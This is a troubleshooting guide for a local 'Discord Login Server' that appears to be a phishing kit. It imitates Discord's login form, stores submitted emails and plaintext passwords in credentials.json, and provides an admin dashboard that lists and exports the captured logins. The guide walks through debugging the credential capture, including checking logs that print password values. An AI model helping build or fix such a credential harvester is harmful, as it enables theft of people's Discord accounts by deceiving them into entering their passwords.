# Troubleshooting Guide

## Issue: Port 3000 Already in Use

**Error:** `EADDRINUSE: address already in use :::3000`

**Solution:** The server now uses port **5000** by default (or any port set in `PORT` environment variable).

```bash
# Option 1: Let it use port 5000
npm start

# Option 2: Use custom port
PORT=8000 npm start
```

---

## Issue: Data Not Saving to JSON

### Step 1: Check Server Logs
When you submit the form, you should see these logs:
```
[v0] Received login request
[v0] Request body: { email: '...', password: '...', timestamp: '...' }
[v0] Successfully saved login: example@email.com
[v0] Credentials file location: /path/to/credentials.json
[v0] Total credentials stored: 1
```

### Step 2: Check Browser Console (F12)
Open DevTools → Console tab, submit the form, and look for:
```
[v0] Email input: <input id="emailORphone">
[v0] Password input: <input id="password">
[v0] Email value: your@email.com
[v0] Password value: yourpassword
[v0] Sending login data: {...}
[v0] Response status: 200
[v0] Login response: { success: true, ... }
```

### Step 3: Verify credentials.json Exists
- Open file explorer
- Look for `credentials.json` in the project root folder
- It should contain an array of login objects

---

## Complete Debug Checklist

✅ **Server is running**
- Should see: `Discord Login Server running at http://localhost:5000`

✅ **Form fields exist**
- Email input with ID: `#emailORphone`
- Password input with ID: `#password`

✅ **API endpoint responds**
- Test in browser console:
  ```javascript
  fetch('/api/get-logins').then(r => r.json()).then(console.log)
  ```

✅ **File permissions**
- Make sure the project folder is writable
- Windows: Right-click folder → Properties → Security → Edit

✅ **Form submission**
- Check Network tab (F12 → Network)
- Submit form and look for POST request to `/api/save-login`
- Should see 200 status with success response

---

## Testing the Admin Dashboard

Once data is saving:

1. Go to: `http://localhost:5000/admin`
2. Click "Load Credentials" button
3. Should see table with all saved logins
4. Try exporting as JSON

---

## Still Not Working?

1. **Kill old processes:**
   ```bash
   # Windows
   netstat -ano | findstr :5000
   taskkill /PID <PID> /F
   
   # Mac/Linux
   lsof -ti:5000 | xargs kill -9
   ```

2. **Delete old credentials.json and restart**

3. **Check firewall settings** - Allow Node.js through

4. **Reinstall dependencies:**
   ```bash
   rm -rf node_modules
   npm install
   npm start
   ```
